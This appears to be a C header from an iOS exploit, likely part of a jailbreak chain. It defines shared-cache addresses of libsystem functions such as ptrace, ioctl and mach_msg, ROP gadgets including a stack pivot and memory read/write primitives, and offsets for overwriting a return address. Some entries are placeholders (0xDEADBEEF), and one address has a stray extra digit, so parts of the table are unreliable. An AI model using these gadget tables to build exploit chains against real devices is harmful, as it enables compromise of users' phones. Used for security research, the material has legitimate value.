#define DEBUG

#define P1				402
#define P2				619
#define P3				625
//   p2 address: 0xXXXXXX[2c]
#define P3_ADDR_LO			0x2c + (P3 - P2) * 4;
#define LR_ADDR_LO			0x30

// libsystem_kernel.dylib
#define _dsc_open			0x332cfdc4
#define _dsc_mkdir			0x332c2c34
#define _dsc_ioctl			(0x332c1bf8 + 1)
#define _dsc_close			0x332c071c
#define _dsc_ptrace			(0x332d0394 + 1)

// libsystem_c.dylib
#define _dsc_fopen			(0x35e5f004 + 1)
#define _dsc_fread			(0x35e65814 + 1)
#define _dsc_fclose			(0x35e5f65c + 1)
#define _dsc_exit			(0x35e619d0 + 1)
#define _dsc_syslog			(0x35e59ad0 + 1)
#define _dsc_sysctl			(0x35e56c64 + 1)
#define _dsc_malloc			(0x35e56184 + 1)
#define _dsc_memmem			(0x35e6fcf0 + 1)
#define _dsc_sleep			(0x35e6da54 + 1)
#define _dsc_mach_msg		(0x332c01d4F + 1)
#define _dsc_bootstrap_look_up		(0xDEADBEEF + 1)
#define _dsc_bsdthread_terminate	(0xDEADBEEF + 1)

#define LIBC_POP_R0			0x35ec6340
#define LIBC_POP_R0123			0x35ec6b10
#define LIBC_POP_R47			(0x35e79f3e + 1)
#define LIBC_BLX_R4_POP_R47		(0x35e79f38 + 1)
#define LIBC_MOV_SP_R4__POP_R47		(0x35e7fcd8 + 1)
#define LIBC_STR_R0_R4__POP_R47		(0x35e9349a + 1)
#define LIBC_LDR_R0_R0__POP_R7		(0x35e594b4 + 1)
#define LIBC_SUB_R0_R4__POP_R4567	(0x35e7e246 + 1)
